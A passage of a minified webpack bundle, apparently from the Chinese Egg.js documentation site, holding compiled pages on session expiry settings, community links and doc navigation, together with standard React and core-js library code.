\u6709\u6548\u671f\u66f4\u957f\u3002\u8fd9\u79cd\u9488\u5bf9\u7279\u5b9a\u7528\u6237\u7684 Session \u6709\u6548\u65f6\u95f4\u8bbe\u7f6e\u6211\u4eec\u53ef\u4ee5\u901a\u8fc7 ",r.a.createElement("code",null,"ctx.session.maxAge=")," \u6765\u5b9e\u73b0\u3002"),r.a.createElement(o["a"],{code:"const ms = require('ms');\nclass UserController extends Controller {\n  async login() {\n    const ctx = this.ctx;\n    const { username, password, rememberMe } = ctx.request.body;\n    const user = await ctx.loginAndGetUser(username, password);\n\n    // \u8bbe\u7f6e Session\n    ctx.session.user = user;\n    // \u5982\u679c\u7528\u6237\u52fe\u9009\u4e86 `\u8bb0\u4f4f\u6211`\uff0c\u8bbe\u7f6e 30 \u5929\u7684\u8fc7\u671f\u65f6\u95f4\n    if (rememberMe) ctx.session.maxAge = ms('30d');\n  }\n}",lang:"js"}),r.a.createElement("h4",{id:"\u5ef6\u957f\u7528\u6237-session-\u6709\u6548\u671f"},r.a.createElement(l["AnchorLink"],{to:"#\u5ef6\u957f\u7528\u6237-session-\u6709\u6548\u671f","aria-hidden":"true",tabIndex:-1},r.a.createElement("span",{className:"icon icon-link"})),"\u5ef6\u957f\u7528\u6237 Session \u6709\u6548\u671f"),r.a.createElement("p",null,"\u9ed8\u8ba4\u60c5\u51b5\u4e0b\uff0c\u5f53\u7528\u6237\u8bf7\u6c42\u6ca1\u6709\u5bfc\u81f4 Session \u88ab\u4fee\u6539\u65f6\uff0c\u6846\u67b6\u90fd\u4e0d\u4f1a\u5ef6\u957f Session \u7684\u6709\u6548\u671f\uff0c\u4f46\u662f\u5728\u6709\u4e9b\u573a\u666f\u4e0b\uff0c\u6211\u4eec\u5e0c\u671b\u7528\u6237\u5982\u679c\u957f\u65f6\u95f4\u90fd\u5728\u8bbf\u95ee\u6211\u4eec\u7684\u7ad9\u70b9\uff0c\u5219\u5ef6\u957f\u4ed6\u4eec\u7684 Session \u6709\u6548\u671f\uff0c\u4e0d\u8ba9\u7528\u6237\u9000\u51fa\u767b\u5f55\u6001\u3002\u6846\u67b6\u63d0\u4f9b\u4e86\u4e00\u4e2a ",r.a.createElement("code",null,"renew")," \u914d\u7f6e\u9879\u7528\u4e8e\u5b9e\u73b0\u6b64\u529f\u80fd\uff0c\u5b83\u4f1a\u5728\u53d1\u73b0\u5f53\u7528\u6237 Session \u7684\u6709\u6548\u671f\u4ec5\u5269\u4e0b\u6700\u5927\u6709\u6548\u671f\u4e00\u534a\u7684\u65f6\u5019\uff0c\u91cd\u7f6e Session \u7684\u6709\u6548\u671f\u3002"),r.a.createElement(o["a"],{code:"// config/config.default.js\nmodule.exports = {\n  session: {\n    renew: true,\n  },\n};",lang:"js"})))}));t["default"]=e=>{var t=r.a.useContext(l["context"]),n=t.demos;return r.a.useEffect((()=>{var t;null!==e&&void 0!==e&&null!==(t=e.location)&&void 0!==t&&t.hash&&l["AnchorLink"].scrollToAnchor(decodeURIComponent(e.location.hash.slice(1)))}),[]),r.a.createElement(i,{demos:n})}},kiOy:function(e,t,n){"use strict";n.r(t);var a=n("FU0I"),r=n.n(a),l=n("j00X"),o=r.a.memo((e=>{e.demos;return r.a.createElement(r.a.Fragment,null,r.a.createElement("div",{className:"markdown"},r.a.createElement("h2",{id:"\u4ea4\u6d41\u7fa4"},r.a.createElement(l["AnchorLink"],{to:"#\u4ea4\u6d41\u7fa4","aria-hidden":"true",tabIndex:-1},r.a.createElement("span",{className:"icon icon-link"})),"\u4ea4\u6d41\u7fa4"),r.a.createElement("ul",null,r.a.createElement("li",null,"\u9489\u9489\u7fa4\u53f7\uff1a21751340\uff0c\u7fa4\u540d\uff1aEgg \u793e\u533a\u4e92\u52a9\u4ea4\u6d41\u7fa4"),r.a.createElement("li",null,"\u5fae\u4fe1\u7fa4\u540d\uff1aEgg \u975e\u5b98\u65b9\u81ea\u52a9\u4ea4\u6d41\u7fa4")),r.a.createElement("h2",{id:"\u8d44\u6e90\u94fe\u63a5"},r.a.createElement(l["AnchorLink"],{to:"#\u8d44\u6e90\u94fe\u63a5","aria-hidden":"true",tabIndex:-1},r.a.createElement("span",{className:"icon icon-link"})),"\u8d44\u6e90\u94fe\u63a5"),r.a.createElement("ul",null,r.a.createElement("li",null,"\u6846\u67b6",r.a.createElement("ul",null,r.a.createElement("li",null,r.a.createElement(l["Link"],{to:"https://github.com/eggjs/aliyun-egg"},"aliyun-egg")))),r.a.createElement("li",null,"\u5de5\u5177",r.a.createElement("ul",null,r.a.createElement("li",null,r.a.createElement(l["Link"],{to:"https://marketplace.visualstudio.com/items?itemName=atian25.eggjs"},"vscode plugin - eggjs")),r.a.createElement("li",null,r.a.createElement(l["Link"],{to:"https://marketplace.visualstudio.com/items?itemName=yuzukwok.eggjs-dev-tools"},"vscode plugin - eggjs-dev-tools")))),r.a.createElement("li",null,"\u5176\u4ed6",r.a.createElement("ul",null,r.a.createElement("li",null,r.a.createElement(l["Link"],{to:"https://github.com/eggjs/awesome-egg"},"awesome-egg")))),r.a.createElement("li",null,"\u6587\u7ae0",r.a.createElement("ul",null,r.a.createElement("li",null,r.a.createElement(l["Link"],{to:"https://www.zhihu.com/question/50526101/answer/144952130"},"\u5982\u4f55\u8bc4\u4ef7\u963f\u91cc\u5f00\u6e90\u7684\u4f01\u4e1a\u7ea7 Node.js \u6846\u67b6 Egg\uff1f")," by ",r.a.createElement(l["Link"],{to:"https://github.com/atian25"},"@\u5929\u732a")),r.a.createElement("li",null,"\u4f60\u4e5f\u53ef\u4ee5\u5230",r.a.createElement(l["Link"],{to:"https://zhuanlan.zhihu.com/eggjs"},"\u77e5\u4e4e\u4e13\u680f"),"\u770b\u6211\u4eec\u7684\u6587\u7ae0")))),r.a.createElement("h2",{id:"\u9879\u76ee\u8d5e\u52a9"},r.a.createElement(l["AnchorLink"],{to:"#\u9879\u76ee\u8d5e\u52a9","aria-hidden":"true",tabIndex:-1},r.a.createElement("span",{className:"icon icon-link"})),"\u9879\u76ee\u8d5e\u52a9"),r.a.createElement("p",null,r.a.createElement(l["Link"],{to:"https://opencollective.com/eggjs#support"},r.a.createElement("img",{src:"https://opencollective.com/eggjs/tiers/sponsors.svg?avatarHeight=48",alt:"sponsors"})),r.a.createElement(l["Link"],{to:"https://opencollective.com/eggjs#support"},r.a.createElement("img",{src:"https://opencollective.com/eggjs/tiers/backers.svg?avatarHeight=48",alt:"backers"}))),r.a.createElement("h2",{id:"\u8d21\u732e\u8005"},r.a.createElement(l["AnchorLink"],{to:"#\u8d21\u732e\u8005","aria-hidden":"true",tabIndex:-1},r.a.createElement("span",{className:"icon icon-link"})),"\u8d21\u732e\u8005"),r.a.createElement("p",null,r.a.createElement(l["Link"],{to:"https://github.com/eggjs/egg/graphs/contributors"},r.a.createElement("img",{src:"https://contrib.rocks/image?repo=eggjs/egg&max=240&columns=26",alt:"contributors"})))))}));t["default"]=e=>{var t=r.a.useContext(l["context"]),n=t.demos;return r.a.useEffect((()=>{var t;null!==e&&void 0!==e&&null!==(t=e.location)&&void 0!==t&&t.hash&&l["AnchorLink"].scrollToAnchor(decodeURIComponent(e.location.hash.slice(1)))}),[]),r.a.createElement(o,{demos:n})}},kjPW:function(e,t,n){var a=n("Xdqv");e.exports=!a((function(){function e(){}return e.prototype.constructor=null,Object.getPrototypeOf(new e)!==e.prototype}))},kqhb:function(e,t,n){"use strict";function a(){if("undefined"!==typeof __REACT_DEVTOOLS_GLOBAL_HOOK__&&"function"===typeof __REACT_DEVTOOLS_GLOBAL_HOOK__.checkDCE){0;try{__REACT_DEVTOOLS_GLOBAL_HOOK__.checkDCE(a)}catch(e){console.error(e)}}}a(),e.exports=n("mQkl")},lDxF:function(e,t,n){"use strict";function a(e){return e&&"object"===typeof e&&"default"in e?e["default"]:e}var r=n("FU0I"),l=a(r);function o(e,t,n){return t in e?Object.defineProperty(e,t,{value:n,enumerable:!0,configurable:!0,writable:!0}):e[t]=n,e}function i(e,t){e.prototype=Object.create(t.prototype),e.prototype.constructor=e,e.__proto__=t}var c=!("undefined"===typeof window||!window.document||!window.document.createElement);function s(e,t,n){if("function"!==typeof e)throw new Error("Expected reducePropsToState to be a function.");if("function"!==typeof t)throw new Error("Expected handleStateChangeOnClient to be a function.");if("undefined"!==typeof n&&"function"!==typeof n)throw new Error("Expected mapStateOnServer to either be undefined or a function.");function a(e){return e.displayName||e.name||"Component"}return function(s){if("function"!==typeof s)throw new Error("Expected WrappedComponent to be a React component.");var u,d=[];function m(){u=e(d.map((function(e){return e.props}))),p.canUseDOM?t(u):n&&(u=n(u))}var p=function(e){function t(){return e.apply(this,arguments)||this}i(t,e),t.peek=function(){return u},t.rewind=function(){if(t.canUseDOM)throw new Error("You may only call rewind() on the server. Call peek() to read the current state.");var e=u;return u=void 0,d=[],e};var n=t.prototype;return n.UNSAFE_componentWillMount=function(){d.push(this),m()},n.componentDidUpdate=function(){m()},n.componentWillUnmount=function(){var e=d.indexOf(this);d.splice(e,1),m()},n.render=function(){return l.createElement(s,this.props)},t}(r.PureComponent);return o(p,"displayName","SideEffect("+a(s)+")"),o(p,"canUseDOM",c),p}}e.exports=s},lMVt:function(e,t,n){var a=n("9u3R"),r=a.Symbol;e.exports=r},lVej:function(e,t,n){"use strict";var a=function(e){var t=arguments.length>1&&void 0!==arguments[1]?arguments[1]:{},n=t.target,a=void 0===n?document.body:n,r=document.createElement("textarea"),l=document.activeElement;r.value=e,r.setAttribute("readonly",""),r.style.contain="strict",r.style.position="absolute",r.style.left="-9999px",r.style.fontSize="12pt";var o=document.getSelection(),i=!1;o.rangeCount>0&&(i=o.getRangeAt(0)),a.append(r),r.select(),r.selectionStart=0,r.selectionEnd=e.length;var c=!1;try{c=document.execCommand("copy")}catch(s){}return r.remove(),i&&(o.removeAllRanges(),o.addRange(i)),l&&l.focus(),c};e.exports=a,e.exports["default"]=a},lgSZ:function(e,t,n){},lhGU:function(e,t,n){"use strict";n.r(t);var a=n("FU0I"),r=n.n(a),l=n("j00X"),o=r.a.memo((e=>{e.demos;return r.a.createElement(r.a.Fragment,null,r.a.createElement("div",{className:"markdown"},r.a.createElement("ul",null,r.a.createElement("li",null,r.a.createElement(l["Link"],{to:"./advanced/loader"},"\u52a0\u8f7d\u5668\uff08Loader\uff09")),r.a.createElement("li",null,r.a.createElement(l["Link"],{to:"./advanced/plugin"},"\u63d2\u4ef6\u5f00\u53d1")),r.a.createElement("li",null,r.a.createElement(l["Link"],{to:"./advanced/framework"},"\u6846\u67b6\u5f00\u53d1")),r.a.createElement("li",null,r.a.createElement(l["Link"],{to:"./advanced/cluster-client"},"\u591a\u8fdb\u7a0b\u7814\u53d1\u6a21\u5f0f\u589e\u5f3a")),r.a.createElement("li",null,r.a.createElement(l["Link"],{to:"./advanced/view-plugin"},"View \u63d2\u4ef6\u5f00\u53d1")),r.a.createElement("li",null,r.a.createElement(l["Link"],{to:"./advanced/loader-update"},"\u5347\u7ea7\u4f60\u7684\u751f\u547d\u5468\u671f\u4e8b\u4ef6\u51fd\u6570")))))}));t["default"]=e=>{var t=r.a.useContext(l["context"]),n=t.demos;return r.a.useEffect((()=>{var t;null!==e&&void 0!==e&&null!==(t=e.location)&&void 0!==t&&t.hash&&l["AnchorLink"].scrollToAnchor(decodeURIComponent(e.location.hash.slice(1)))}),[]),r.a.createElement(o,{demos:n})}},ljBM:function(e,t,n){"use strict";n.r(t);var a=n("FU0I"),r=n.n(a),l=n("j00X"),o=r.a.memo((e=>{e.demos;return r.a.createElement(r.a.Fragment,null,r.a.createElement("div",{className:"markdown"},r.a.createElement("ul",null,r.a.createElement("li",null,r.a.createElement(l["Link"],{to:"./basics/structure"},"\u76ee\u5f55\u7ed3\u6784")),r.a.createElement("li",null,r.a.createElement(l["Link"],{to:"./basics/objects"},"\u5185\u7f6e\u5bf9\u8c61")),r.a.createElement("li",null,r.a.createElement(l["Link"],{to:"./basics/env"},"\u8fd0\u884c\u73af\u5883")),r.a.createElement("li",null,r.a.createElement(l["Link"],{to:"./basics/config"},"\u914d\u7f6e")),r.a.createElement("li",null,r.a.createElement(l["Link"],{to:"./basics/middleware"},"\u4e2d\u95f4\u4ef6")),r.a.createElement("li",null,r.a.createElement(l["Link"],{to:"./basics/router"},"\u8def\u7531")),r.a.createElement("li",null,r.a.createElement(l["Link"],{to:"./basics/controller"},"\u63a7\u5236\u5668")),r.a.createElement("li",null,r.a.createElement(l["Link"],{to:"./basics/service"},"\u670d\u52a1")),r.a.createElement("li",null,r.a.createElement(l["Link"],{to:"./basics/plugin"},"\u63d2\u4ef6")),r.a.createElement("li",null,r.a.createElement(l["Link"],{to:"./basics/schedule"},"\u5b9a\u65f6\u4efb\u52a1")),r.a.createElement("li",null,r.a.createElement(l["Link"],{to:"./basics/extend"},"\u6846\u67b6\u62d3\u5c55")),r.a.createElement("li",null,r.a.createElement(l["Link"],{to:"./basics/app-start"},"\u542f\u52a8\u81ea\u5b9a\u4e49")))))}));t["default"]=e=>{var t=r.a.useContext(l["context"]),n=t.demos;return r.a.useEffect((()=>{var t;null!==e&&void 0!==e&&null!==(t=e.location)&&void 0!==t&&t.hash&&l["AnchorLink"].scrollToAnchor(decodeURIComponent(e.location.hash.slice(1)))}),[]),r.a.createElement(o,{demos:n})}},lkDA:function(e,t,n){"use strict";function a(){var e=n("FU0I");return a=function(){return e},e}Object.defineProperty(t,"__esModule",{value:!0}),t.getDemoUrl=t.getDemoRouteName=t["default"]=void 0;var r=l(n("D7X3"));function l(e){return e&&e.__esModule?e:{default:e}}function o(e,t){return d(e)||u(e,t)||c(e,t)||i()}function i(){throw new TypeError("Invalid attempt to destructure non-iterable instance.\nIn order to be iterable, non-array objects must have a [Symbol.iterator]() method.")}function c(e,t){if(e){if("string"===typeof e)return s(e,t);var n=Object.prototype.toString.call(e).slice(8,-1);return"Object"===n&&e.constructor&&(n=e.constructor.name),"Map"===n||"Set"===n?Array.from(e):"Arguments"===n||/^(?:Ui|I)nt(?:8|16|32)(?:Clamped)?Array$/.test(n)?s(e,t):void 0}}function s(e,t){(null==t||t>e.length)&&(t=e.length);for(var n=0,a=new Array(t);n<t;n++)a[n]=e[n];return a}function u(e,t){var n=null==e?null:"undefined"!=typeof Symbol&&e[Symbol.iterator]||e["@@iterator"];if(null!=n){var a,r,l,o,i=[],c=!0,s=!1;try{if(l=(n=n.call(e)).next,0===t){if(Object(n)!==n)return;c=!1}else for(;!(c=(a=l.call(n)).done)&&(i.push(a.value),i.length!==t);c=!0);}catch(u){s=!0,r=u}finally{try{if(!c&&null!=n["return"]&&(o=n["return"](),Object(o)!==o))return}finally{if(s)throw r}}return i}}function d(e){if(Array.isArray(e))return e}function m(){return"BASEMENT"===Object({NODE_ENV:"production"}).PLATFORM_TYPE}var p=function(){return m()?"_demos":"~demos"};t.getDemoRouteName=p;var h=function(e,t){var n,a=window,r=a.location,l=r.href,i=r.origin,c=l.split(/#\//),s=o(c,2),u=s[0],d=s[1],m="string"===typeof d;return[m?"".concat(u,"#"):i,"".concat((null===(n=window)||void 0===n?void 0:n.routerBase)||"","/").replace(/\/\/$/,"/"),p(),"/",e,"".concat(t?".html":"")].join("")};t.getDemoUrl=h;var g=function(e){var t=(0,a().useContext)(r["default"]),n=t.config,l=(0,a().useState)(""),i=o(l,2),c=i[0],s=i[1];return(0,a().useEffect)((function(){s(e?h(e,n.exportStatic&&n.exportStatic.htmlSuffix):null)}),[e,n]),c};t["default"]=g},lwrH:function(e,t,n){var a=n("9Rcy"),r=n("u3TI"),l=n("oyD1"),o=n("qUkb");e.exports=a?Object.defineProperties:function(e,t){l(e);var n,a=o(t),i=a.length,c=0;while(i>c)r.f(e,n=a[c++],t[n]);return e}},"lz/I":function(e,t,n){var a,r,l,o=n("93kG"),i=n("A0UU"),c=n("a7jj"),s=n("XExY"),u=n("31yA"),d=n("VPwr"),m=n("pX0n"),p=i.WeakMap,h=function(e){return l(e)?r(e):a(e,{})},g=function(e){return function(t){var n;if(!c(t)||(n=r(t)).type!==e)throw TypeError("Incompatible receiver, "+e+" required");return n}};if(o){var f=new p,E=f.get,b=f.has,v=f.set;a=function(e,t){return v.call(f,e,t),t},r=function(e){return E.call(f,e)||{}},l=function(e){return b.call(f,e)}}else{var y=d("state");m[y]=!0,a=function(e,t){return s(e,y,t),t},r=function(e){return u(e,y)?e[y]:{}},l=function(e){return u(e,y)}}e.exports={set:a,get:r,has:l,enforce:h,getterFor:g}},"m/os":function(e,t,n){var a=n("tS9j");e.exports=function(e){return Object(a(e))}},"m4/z":function(e,t){e.exports=!1},mCYO:function(e,t,n){var a=n("0mt+"),r=n("7un0"),l=n("oyD1"),o=r.keys,i=r.toKey;a({target:"Reflect",stat:!0},{getOwnMetadataKeys:function(e){var t=arguments.length<2?void 0:i(arguments[1]);return o(l(e),t)}})},mIyh:function(e,t,n){var a=n("Xdqv"),r=n("q7Pv"),l=n("/bXB"),o=r("species");e.exports=function(e){return l>=51||!a((function(){var t=[],n=t.constructor={};return n[o]=function(){return{foo:1}},1!==t[e](Boolean).foo}))}},mQkl:function(e,t,n){"use strict";var a=n("FU0I"),r=n("G0Yp"),l=n("1RB8");function o(e){for(var t="https://reactjs.org/docs/error-decoder.html?invariant="+e,n=1;n<arguments.length;n++)t+="&args[]="+encodeURIComponent(arguments[n]);return"Minified React error #"+e+"; visit "+t+" for the full message or use the non-minified dev environment for full errors and additional helpful warnings."}if(!a)throw Error(o(227));function i(e,t,n,a,r,l,o,i,c){var s=Array.prototype.slice.call(arguments,3);try{t.apply(n,s)}catch(u){this.onError(u)}}var c=!1,s=null,u=!1,d=null,m={onError:function(e){c=!0,s=e}};function p(e,t,n,a,r,l,o,u,d){c=!1,s=null,i.apply(m,arguments)}function h(e,t,n,a,r,l,i,m,h){if(p.apply(this,arguments),c){if(!c)throw Error(o(198));var g=s;c=!1,s=null,u||(u=!0,d=g)}}var g=null,f=null,E=null;function b(e,t,n){var a=e.type||"unknown-event";e.currentTarget=E(n),h(a,t,void 0,e),e.currentTarget=null}var v=null,y={};function k(){if(v)for(var e in y){var t=y[e],n=v.indexOf(e);if(!(-1<n))throw Error(o(96,e));if(!x[n]){if(!t.extractEvents)throw Error(o(97,e));for(var a in x[n]=t,n=t.eventTypes,n){var r=void 0,l=n[a],i=t,c=a;if(j.hasOwnProperty(c))throw Error(o(99,c));j[c]=l;var s=l.phasedRegistrationNames;if(s){for(r in s)s.hasOwnProperty(r)&&w(s[r],i,c);r=!0}else l.registrationName?(w(l.registrationName,i,c),r=!0):r=!1;if(!r)throw Error(o(98,a,e))}}}}function w(e,t,n){if(S[e])throw Error(o(100,e));S[e]=t,C[e]=t.eventTypes[n].dependencies}var x=[],j={},S={},C={};function A(e){var t,n=!1;for(t in e)if(e.hasOwnProperty(t)){var a=e[t];if(!y.hasOwnProperty(t)||y[t]!==a){if(y[t])throw Error(o(102,t));y[t]=a,n=!0}}n&&k()}var L=!("undefined"===typeof window||"undefined"===typeof window.document||"undefined"===typeof window.document.createElement),T=null,N=null,O=null;function I(e){if(e=f(e)){if("function"!==typeof T)throw Error(o(280));var t=e.stateNode;t&&(t=g(t),T(e.stateNode,e.type,t))}}function P(e){N?O?O.push(e):O=[e]:N=e}function R(){if(N){var e=N,t=O;if(O=N=null,I(e),t)for(e=0;e<t.length;e++)I(t[e])}}function _(e,t){return e(t)}function q(e,t,n,a,r){return e(t,n,a,r)}function M(){}var F=_,D=!1,U=!1;function z(){null===N&&null===O||(M(),R())}function H(e,t,n){if(U)return e(t,n);U=!0;try{return F(e,t,n)}finally{U=!1,z()}}var B=/^[:A-Z_a-z\u00C0-\u00D6\u00D8-\u00F6\u00F8-\u02FF\u0370-\u037D\u037F-\u1FFF\u200C-\u200D\u2070-\u218F\u2C00-\u2FEF\u3001-\uD7FF\uF900-\uFDCF\uFDF0-\uFFFD][:A-Z_a-z\u00C0-\u00D6\u00D8-\u00F6\u00F8-\u02FF\u0370-\u037D\u037F-\u1FFF\u200C-\u200D\u2070-\u218F\u2C00-\u2FEF\u3001-\uD7FF\uF900-\uFDCF\uFDF0-\uFFFD\-.0-9\u00B7\u0300-\u036F\u203F-\u2040]*$/,W=Object.prototype.hasOwnProperty,V={},$={};function G(e){return!!W.call($,e)||!W.call(V,e)&&(B.test(e)?$[e]=!0:(V[e]=!0,!1))}function X(e,t,n,a){if(null!==n&&0===n.type)return!1;switch(typeof t){case"function":case"symbol":return!0;case"boolean":return!a&&(null!==n?!n.acceptsBooleans:(e=e.toLowerCase().slice(0,5),"data-"!==e&&"aria-"!==e));default:return!1}}function Q(e,t,n,a){if(null===t||"undefined"===typeof t||X(e,t,n,a))return!0;if(a)return!1;if(null!==n)switch(n.type){case 3:return!t;case 4:return!1===t;case 5:return isNaN(t);case 6:return isNaN(t)||1>t}return!1}function K(e,t,n,a,r,l){this.acceptsBooleans=2===t||3===t||4===t,this.attributeName=a,this.attributeNamespace=r,this.mustUseProperty=n,this.propertyName=e,this.type=t,this.sanitizeURL=l}var J={};"children dangerouslySetInnerHTML defaultValue defaultChecked innerHTML suppressContentEditableWarning suppressHydrationWarning style".split(" ").forEach((function(e){J[e]=new K(e,0,!1,e,null,!1)})),[["acceptCharset","accept-charset"],["className","class"],["htmlFor","for"],["httpEquiv","http-equiv"]].forEach((function(e){var t=e[0];J[t]=new K(t,1,!1,e[1],null,!1)})),["contentEditable","draggable","spellCheck","value"].forEach((function(e){J[e]=new K(e,2,!1,e.toLowerCase(),null,!1)})),["autoReverse","externalResourcesRequired","focusable","preserveAlpha"].forEach((function(e){J[e]=new K(e,2,!1,e,null,!1)})),"allowFullScreen async autoFocus autoPlay controls default defer disabled disablePictureInPicture formNoValidate hidden loop noModule noValidate open playsInline readOnly required reversed scoped seamless itemScope".split(" ").forEach((function(e){J[e]=new K(e,3,!1,e.toLowerCase(),null,!1)})),["checked","multiple","muted","selected"].forEach((function(e){J[e]=new K(e,3,!0,e,null,!1)})),["capture","download"].forEach((function(e){J[e]=new K(e,4,!1,e,null,!1)})),["cols","rows","size","span"].forEach((function(e){J[e]=new K(e,6,!1,e,null,!1)})),["rowSpan","start"].forEach((function(e){J[e]=new K(e,5,!1,e.toLowerCase(),null,!1)}));var Y=/[\-:]([a-z])/g;function Z(e){return e[1].toUpperCase()}"accent-height alignment-baseline arabic-form baseline-shift cap-height clip-path clip-rule color-interpolation color-interpolation-filters color-profile color-rendering dominant-baseline enable-background fill-opacity fill-rule flood-color flood-opacity font-family font-size font-size-adjust font-stretch font-style font-variant font-weight glyph-name glyph-orientation-horizontal glyph-orientation-vertical horiz-adv-x horiz-origin-x image-rendering letter-spacing lighting-color marker-end marker-mid marker-start overline-position overline-thickness paint-order panose-1 pointer-events rendering-intent shape-rendering stop-color stop-opacity strikethrough-position strikethrough-thickness stroke-dasharray stroke-dashoffset stroke-linecap stroke-linejoin stroke-miterlimit stroke-opacity stroke-width text-anchor text-decoration text-rendering underline-position underline-thickness unicode-bidi unicode-range units-per-em v-alphabetic v-hanging v-ideographic v-mathematical vector-effect vert-adv-y vert-origin-x vert-origin-y word-spacing writing-mode xmlns:xlink x-height".split(" ").forEach((function(e){var t=e.replace(Y,Z);J[t]=new K(t,1,!1,e,null,!1)})),"xlink:actuate xlink:arcrole xlink:role xlink:show xlink:title xlink:type".split(" ").forEach((function(e){var t=e.replace(Y,Z);J[t]=new K(t,1,!1,e,"http://www.w3.org/1999/xlink",!1)})),["xml:base","xml:lang","xml:space"].forEach((function(e){var t=e.replace(Y,Z);J[t]=new K(t,1,!1,e,"http://www.w3.org/XML/1998/namespace",!1)})),["tabIndex","crossOrigin"].forEach((function(e){J[e]=new K(e,1,!1,e.toLowerCase(),null,!1)})),J.xlinkHref=new K("xlinkHref",1,!1,"xlink:href","http://www.w3.org/1999/xlink",!0),["src","href","action","formAction"].forEach((function(e){J[e]=new K(e,1,!1,e.toLowerCase(),null,!0)}));var ee=a.__SECRET_INTERNALS_DO_NOT_USE_OR_YOU_WILL_BE_FIRED;function te(e,t,n,a){var r=J.hasOwnProperty(t)?J[t]:null,l=null!==r?0===r.type:!a&&(2<t.length&&("o"===t[0]||"O"===t[0])&&("n"===t[1]||"N"===t[1]));l||(Q(t,n,r,a)&&(n=null),a||null===r?G(t)&&(null===n?e.removeAttribute(t):e.setAttribute(t,""+n)):r.mustUseProperty?e[r.propertyName]=null===n?3!==r.type&&"":n:(t=r.attributeName,a=r.attributeNamespace,null===n?e.removeAttribute(t):(r=r.type,n=3===r||4===r&&!0===n?"":""+n,a?e.setAttributeNS(a,t,n):e.setAttribute(t,n))))}ee.hasOwnProperty("ReactCurrentDispatcher")||(ee.ReactCurrentDispatcher={current:null}),ee.hasOwnProperty("ReactCurrentBatchConfig")||(ee.ReactCurrentBatchConfig={suspense:null});var ne=/^(.*)[\\\/]/,ae="function"===typeof Symbol&&Symbol.for,re=ae?Symbol.for("react.element"):60103,le=ae?Symbol.for("react.portal"):60106,oe=ae?Symbol.for("react.fragment"):60107,ie=ae?Symbol.for("react.strict_mode"):60108,ce=ae?Symbol.for("react.profiler"):60114,se=ae?Symbol.for("react.provider"):60109,ue=ae?Symbol.for("react.context"):60110,de=ae?Symbol.for("react.concurrent_mode"):60111,me=ae?Symbol.for("react.forward_ref"):60112,pe=ae?Symbol.for("react.suspense"):60113,he=ae?Symbol.for("react.suspense_list"):60120,ge=ae?Symbol.for("react.memo"):60115,fe=ae?Symbol.for("react.lazy"):60116,Ee=ae?Symbol.for("react.block"):60121,be="function"===typeof Symbol&&Symbol.iterator;function ve(e){return null===e||"object"!==typeof e?null:(e=be&&e[be]||e["@@iterator"],"function"===typeof e?e:null)}function ye(e){if(-1===e._status){e._status=0;var t=e._ctor;t=t(),e._result=t,t.then((function(t){0===e._status&&(t=t.default,e._status=1,e._result=t)}),(function(t){0===e._status&&(e._status=2,e._result=t)}))}}function ke(e){if(null==e)return null;if("function"===typeof e)return e.displayName||e.name||null;if("string"===typeof e)return e;switch(e){case oe:return"Fragment";case le:return"Portal";case ce:return"Profiler";case ie:return"StrictMode";case pe:return"Suspense";case he:return"SuspenseList"}if("object"===typeof e)switch(e.$$typeof){case ue:return"Context.Consumer";case se:return"Context.Provider";case me:var t=e.render;return t=t.displayName||t.name||"",e.displayName||(""!==t?"ForwardRef("+t+")":"ForwardRef");case ge:return ke(e.type);case Ee:return ke(e.render);case fe:if(e=1===e._status?e._result:null)return ke(e)}return null}function we(e){var t="";do{e:switch(e.tag){case 3:case 4:case 6:case 7:case 10:case 9:var n="";break e;default:var a=e._debugOwner,r=e._debugSource,l=ke(e.type);n=null,a&&(n=ke(a.type)),a=l,l="",r?l=" (at "+r.fileName.replace(ne,"")+":"+r.lineNumber+")":n&&(l=" (created by "+n+")"),n="\n    in "+(a||"Unknown")+l}t+=n,e=e.return}while(e);return t}function xe(e){switch(typeof e){case"boolean":case"number":case"object":case"string":case"undefined":return e;default:return""}}function je(e){var t=e.type;return(e=e.nodeName)&&"input"===e.toLowerCase()&&("checkbox"===t||"radio"===t)}function Se(e){var t=je(e)?"checked":"value",n=Object.getOwnPropertyDescriptor(e.constructor.prototype,t),a=""+e[t];if(!e.hasOwnProperty(t)&&"undefined"!==typeof n&&"function"===typeof n.get&&"function"===typeof n.set){var r=n.get,l=n.set;return Object.defineProperty(e,t,{configurable:!0,get:function(){return r.call(this)},set:function(e){a=""+e,l.call(this,e)}}),Object.defineProperty(e,t,{enumerable:n.enumerable}),{getValue:function(){return a},setValue:function(e){a=""+e},stopTracking:function(){e._valueTracker=null,delete e[t]}}}}function Ce(e){e._valueTracker||(e._valueTracker=Se(e))}function Ae(e){if(!e)return!1;var t=e._valueTracker;if(!t)return!0;var n=t.getValue(),a="";return e&&(a=je(e)?e.checked?"true":"false":e.value),e=a,e!==n&&(t.setValue(e),!0)}function Le(e,t){var n=t.checked;return r({},t,{defaultChecked:void 0,defaultValue:void 0,value:void 0,checked:null!=n?n:e._wrapperState.initialChecked})}function Te(e,t){var n=null==t.defaultValue?"":t.defaultValue,a=null!=t.checked?t.checked:t.defaultChecked;n=xe(null!=t.value?t.value:n),e._wrapperState={initialChecked:a,initialValue:n,controlled:"checkbox"===t.type||"radio"===t.type?null!=t.checked:null!=t.value}}function Ne(e,t){t=t.checked,null!=t&&te(e,"checked",t,!1)}function Oe(e,t){Ne(e,t);var n=xe(t.value),a=t.type;if(null!=n)"number"===a?(0===n&&""===e.value||e.value!=n)&&(e.value=""+n):e.value!==""+n&&(e.value=""+n);else if("submit"===a||"reset"===a)return void e.removeAttribute("value");t.hasOwnProperty("value")?Pe(e,t.type,n):t.hasOwnProperty("defaultValue")&&Pe(e,t.type,xe(t.defaultValue)),null==t.checked&&null!=t.defaultChecked&&(e.defaultChecked=!!t.defaultChecked)}function Ie(e,t,n){if(t.hasOwnProperty("value")||t.hasOwnProperty("defaultValue")){var a=t.type;if(!("submit"!==a&&"reset"!==a||void 0!==t.value&&null!==t.value))return;t=""+e._wrapperState.initialValue,n||t===e.value||(e.value=t),e.defaultValue=t}n=e.name,""!==n&&(e.name=""),e.defaultChecked=!!e._wrapperState.initialChecked,""!==n&&(e.name=n)}function Pe(e,t,n){"number"===t&&e.ownerDocument.activeElement===e||(null==n?e.defaultValue=""+e._wrapperState.initialValue:e.defaultValue!==""+n&&(e.defaultValue=""+n))}function Re(e){var t="";return a.Children.forEach(e,(function(e){null!=e&&(t+=e)})),t}function _e(e,t){return e=r({children:void 0},t),(t=Re(t.children))&&(e.children=t),e}function qe(e,t,n,a){if(e=e.options,t){t={};for(var 